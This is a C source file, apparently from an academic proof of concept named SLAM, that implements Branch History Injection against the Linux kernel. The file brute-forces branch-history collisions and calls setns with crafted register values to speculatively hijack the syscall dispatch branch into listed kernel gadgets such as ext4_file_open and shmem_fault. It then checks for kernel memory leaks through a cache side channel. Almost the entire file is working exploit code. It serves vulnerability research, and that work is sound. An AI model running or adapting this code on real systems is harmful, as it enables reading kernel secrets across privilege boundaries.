/* Branch History Injection functionality.
 *
 * Date: November 23, 2023
 * Author: Mathé Hertogh - Vrije Universiteit Amsterdam
 */

#include "slam.h"
#include <bits/types/cookie_io_functions_t.h>

// #define VICTIM_SYSCALL_NR 438 // pidfd_getfd
#define VICTIM_SYSCALL_NR 308 // setns
// #define VICTIM_SYSCALL_NR 309 // getcpu

#define HISTORY_LEN 512 // Randomized history length for collision finding.

#define SIGNATURE "9X7DU\0\0BIEUS!"
#define NR_SIGNATURES 1
static char **signatures;

// BHB history to collide our victim system call with our target system call.
static char history[HISTORY_LEN];

static void bhi_alloc_signatures()
{
	signatures = malloc(NR_SIGNATURES * sizeof(char *));
	for (int i = 0; i < NR_SIGNATURES; i++) {
		signatures[i] = alloc_contiguous_pages(NULL, 0);
		strcpy(signatures[i], SIGNATURE);
		pr_debug(CLEAR_LINE "allocating signature pages (%d / %d)", i, NR_SIGNATURES);
	}
	pr_debug("\ndone\n");
}

static void bhi_free_signatures()
{
	for (int i = 0; i < NR_SIGNATURES; i++)
		munmap(signatures[i], HUGE_PAGE_SIZE);
	free(signatures);
}

static void randomize(char history[])
{
	for(int i = 0; i < 10; i++)
		history[rand() % HISTORY_LEN] ^= 1;
}

static void pr_hist(char history[])
{
	pr_debug("history: ");
	for (int i = 0; i < HISTORY_LEN; i++)
		pr_debug("%d", history[i]);
	pr_debug("\n");
}

/* Trigger the victim system call with malicious input, speculatively hijacking
 * control flow at the indirect branch to the system call handler. At that
 * point, rdi points to the kernel stack holding the user's registers, as such:
 *   addr     | data
 *   ---------+-----
 *   rdi      | r15
 *   rdi+0x8  | r14
 *   rdi+0x10 | r13
 *   rdi+0x18 | r12
 *   rdi+0x20 | rbp
 *   rdi+0x28 | rbx
 *   rdi+0x30 | r11
 *   rdi+0x38 | r10
 *   rdi+0x40 | r9
 *   rdi+0x48 | r8
 *   rdi+0x50 | 0xffffffffffffffda
 *   rdi+0x58 | rcx
 *   rdi+0x60 | rdx
 *   rdi+0x68 | rsi
 *   rdi+0x70 | rdi
 *   rdi+0x78 | rax
 *   rdi+0x80 | rcx
 *   rdi+0x88 | 0x33
 *   rdi+0x90 | r11
 *
 * Each gadget looks as follows:
 *   mov    rax, QWORD PTR [rdi+OFF1]    ; Load attacker controlled data
 *   mov    rbx, QWORD PTR [rax+OFF2]    ; Load secret data
 *   mov    rcx, intel_lam_mask(rbx)     ; Simulate Intel LAM
 *   mov    QWORD PTR [rcx+OFF3], rdx    ; Translate the secret data
 *
 * Based the particular gadget, we insert malicious data into the system call
 * via varying registers.
 */
static void bhi_trigger_victim_syscall(char *secret_ptr)
{
#ifdef CGROUP_SEQFILE_SHOW
	/* <cgroup_seqfile_show>:
	 *   mov    rax, QWORD PTR [rdi+0x70]
	 *   mov    rdx, QWORD PTR [rax]
	 *   mov    rax, intel_lam_mask(rdx)
	 *   mov    r14, QWORD PTR [rax+0x60]
	 */
	fill_bhb_syscall(history, VICTIM_SYSCALL_NR, (uint64_t)secret_ptr, 0, 0, 0);
#endif
#ifdef EXT4_FILE_OPEN
	/* <ext4_file_open>:
	 *   mov    r14, QWORD PTR [rdi+0x28]
	 *   mov    rbx, QWORD PTR [r14+0x398]
	 *   mov    rax, intel_lam_mask(rbx)
	 *   mov    rax, QWORD PTR [rax+0x230]
	 */
	asm volatile ("mov %0, %%rbx\n" : : "r"((uint64_t)secret_ptr - 0x398) : "%rbx");
	fill_bhb_syscall(history, VICTIM_SYSCALL_NR, 0, 0, 0, 0);
#endif
#ifdef EXT4_FILE_WRITE_ITER
	/* <ext4_file_write_iter>:
	 *   mov    rax, QWORD PTR [rdi]
	 *   mov    rcx, QWORD PTR [rax+0x20]
	 *   mov    rax, intel_lam_mask(rcx)
	 *   mov    rdx, QWORD PTR [rax+0x28]
	 */
	asm volatile ("mov %0, %%r15\n" : : "r"((uint64_t)secret_ptr - 0x20) : "%r15");
	fill_bhb_syscall(history, VICTIM_SYSCALL_NR, 0, 0, 0, 0);
#endif
#ifdef HUGETLBFS_READ_ITER
	/* <hugetlbfs_read_iter>:
	 *   mov    rcx, QWORD PTR [rdi]
	 *   mov    rdx, QWORD PTR [rcx+0x20]
	 *   mov    rax, intel_lam_mask(rdx)
	 *   mov    rax, QWORD PTR [rax+0x28]
	 */
	asm volatile ("mov %0, %%r15\n" : : "r"((uint64_t)secret_ptr - 0x20) : "%r15");
	fill_bhb_syscall(history, VICTIM_SYSCALL_NR, 0, 0, 0, 0);
#endif
#ifdef KERNFS_FOP_READ_ITER
	/* <kernfs_fop_read_iter>:
	 *   mov    rax, QWORD PTR [rdi]
	 *   mov    rcx, QWORD PTR [rax+0xc8]
	 *   mov    rax, intel_lam_mask(rcx)
	 *   mov    rax, QWORD PTR [rax+0x70]
	 */
	asm volatile ("mov %0, %%r15\n" : : "r"((uint64_t)secret_ptr - 0xc8) : "%r15");
	fill_bhb_syscall(history, VICTIM_SYSCALL_NR, 0, 0, 0, 0);
#endif
#ifdef KERNFS_SEQ_SHOW
	/* <kernfs_seq_show>:
	 *   mov    r8,  QWORD PTR [rdi+0x70]
	 *   mov    rdx, QWORD PTR [r8]
	 *   mov    rax, intel_lam_mask(rdx)
	 *   mov    rax, QWORD PTR [rax+0x48]
	 */
	fill_bhb_syscall(history, VICTIM_SYSCALL_NR, (uint64_t)secret_ptr, 0, 0, 0);
#endif
#ifdef PROC_SIGNLE_SHOW
	/* <proc_single_show>:
	 *   mov    rbx, QWORD PTR [rdi+0x70]
	 *   mov    rdx, QWORD PTR [rbx+0x28]
	 *   mov    rax, intel_lam_mask(rdx)
	 *   mov    rax, QWORD PTR [rax+0x398]
	 */
	fill_bhb_syscall(history, VICTIM_SYSCALL_NR, (uint64_t)secret_ptr - 0x28, 0, 0, 0);
#endif
#ifdef RAW_SEQ_START
	/* <raw_seq_start>:
	 *   mov    rax, QWORD PTR [rdi+0x68]
	 *   mov    rdx, QWORD PTR [rax+0x20]
	 *   mov    rax, intel_lam_mask(rdx)
	 *   mov    rdi, QWORD PTR [rax+0x270]
	 */
	fill_bhb_syscall(history, VICTIM_SYSCALL_NR, 0, (uint64_t)secret_ptr - 0x20, 0, 0);
#endif
#ifdef SEL_READ_MLS
	/* <sel_read_mls>:
	 *   mov    rax, QWORD PTR [rdi+0x20]
	 *   mov    rdx, QWORD PTR [rax+0x28]
	 *   mov    rax, intel_lam_mask(rdx)
	 *   mov    rax, QWORD PTR [rax+0x398]
	 */
	uint64_t rbp; // TODO clean up
	asm volatile ("mov %%rbp, %0\n" : "=m"(rbp));
	asm volatile ("mov %0, %%rbp\n" : : "r"((uint64_t)secret_ptr - 0x28));
	fill_bhb_syscall(history, VICTIM_SYSCALL_NR, 0, 0, 0, 0);
	asm volatile ("mov %0, %%rbp\n" : : "m"(rbp));
#endif
#ifdef SHMEM_FAULT
	/* <shmem_fault>:
	 *   mov    r9,  QWORD PTR [rdi]
	 *   mov    rdx, QWORD PTR [r9+0x70]
	 *   mov    rax, intel_lam_mask(rdx)
	 *   mov    r12, QWORD PTR [rax+0x20]
	 */
	asm volatile ("mov %0, %%r15\n" : : "r"((uint64_t)secret_ptr - 0x70) : "%r15");
	fill_bhb_syscall(history, VICTIM_SYSCALL_NR, 0, 0, 0, 0);
#endif
#ifdef SHMEM_STATFS
	/* <shmem_statfs>:
	 *   mov    rax, QWORD PTR [rdi+0x68]
	 *   mov    rax, QWORD PTR [rax+0x398]
	 *   mov    r12, intel_lam_mask(rax)
	 *   mov    r14, QWORD PTR [r12]
	 */
	fill_bhb_syscall(history, VICTIM_SYSCALL_NR, 0, (uint64_t)secret_ptr - 0x398, 0, 0);
#endif
}

static int collision_attempts = 0;

/* Find a history making our victim system call collide with the gadget in our
 * target system call, by brute force.
 */
static void bhi_collide_history(uint64_t direct_map)
{
	collision_attempts++;
	randomize(history);

	/* Start searching. 
	 */
	int nr_hits = 0, nr_tries = 0;
	while (collision_attempts < 100000000) {
		if (++collision_attempts % 20000 == 0)
			pr_interactive(CLEAR_LINE "Searching branch history collision. (%d attempts)", collision_attempts);
		nr_tries++;

		signal_reset(0);
		gadget_trigger(reload_buf());
		gadget_trigger(reload_buf());
		nr_hits += signal_raw_read(0) <= THRES;
		
		if (nr_hits >= 10000)
			break;
		if (nr_hits < nr_tries/2) {
			randomize(history);
			nr_tries = 0;
			nr_hits = 0;
		}
		if (nr_tries == 4 || nr_tries == 10 || nr_tries == 50 || nr_tries == 500)
			pr_debug("%d / %d\n", nr_hits, nr_tries);
	}

	if (nr_hits >= 10000) {
		pr_debug("found history\n");
		pr_hist(history);
	}
	else {
		step_end();
		fail("BHI failed: did not find BHB collision");
	}

	pr_debug("%s: %d", gadget_name(), collision_attempts/100000);
	pr_info(CLEAR_LINE "Searching branch history collision. (%d attempts)\n", collision_attempts);
	pr_verbose("nr_hits %d / %d\n", nr_hits, nr_tries);
}

#define NR_TESTS 10000
#define MIN_SIGNAL 50.0

/* Check whether or not we correctly collided our history in order to reach our
 * gagdet, using a single dereference signal.
 */
static int bhi_check_sd(uint64_t direct_map)
{
	int nr_hits = 0;
	for (int i = 0; i < NR_TESTS; i++) {
		signal_reset(0);
		gadget_trigger(reload_buf());
		gadget_trigger(reload_buf());
		nr_hits += signal_raw_read(0) <= THRES;
	}
	float signal = 100.0 * nr_hits / NR_TESTS;
	pr_info("Found a potential history collision; single dereference signal: %5.2f%%%s\n",
		signal, signal >= MIN_SIGNAL ? "." : " (too weak).");

	return signal >= MIN_SIGNAL;
}

static int bhi_check_dd(uint64_t direct_map)
{
	uint64_t signature = leak_addr(direct_map, direct_map+PHYS_MEM_SIZE, HUGE_PAGE_SIZE, SIGNATURE);
	if (signature == -1)
		return 0;
	// uint64_t signature = direct_map_alias((uint64_t)signatures[0], direct_map);

	int misalignment = 1;
	reload_replace_buf(SIGNATURE, misalignment);
	int correct_byte = ((*(uint32_t *)SIGNATURE & 0xff000) >> 12) - misalignment;

	int nr_hits = 0;
	for (int i = 0; i < NR_TESTS; i++)
		nr_hits += signal_hit((void *)signature, correct_byte);
	float signal = 100.0 * nr_hits / NR_TESTS;
	pr_info("Double dereference signal: %5.2f%%%s\n", signal, signal >= MIN_SIGNAL ? "." : " (too weak).");

	return signal >= MIN_SIGNAL;
}

static int bhi_check(uint64_t direct_map)
{
	return bhi_check_sd(direct_map) && bhi_check_dd(direct_map);
}

void bhi_init(uint64_t direct_map)
{
	pr_info("\n=====[Find BHI collisions]=====\n");
	step_start();

	// Start with a fully random history.
	for(int i = 0; i < HISTORY_LEN; i++)
		history[i] = rand() & 1;

	bhi_alloc_signatures();

	do {
		bhi_collide_history(direct_map);
	} while (!bhi_check(direct_map));

	bhi_free_signatures();

	pr_debug("init history took %d tries\n", collision_attempts);
	step_end();
}

void bhi_trigger_gadget(char *secret_ptr)
{
	// Enlarge the transient execution window.
	evict_syscall_table_entry(VICTIM_SYSCALL_NR);

	// Trigger the gadget speculatively by hijacking the indirect branch to
	// the system call handler.
	bhi_trigger_victim_syscall(secret_ptr);
}
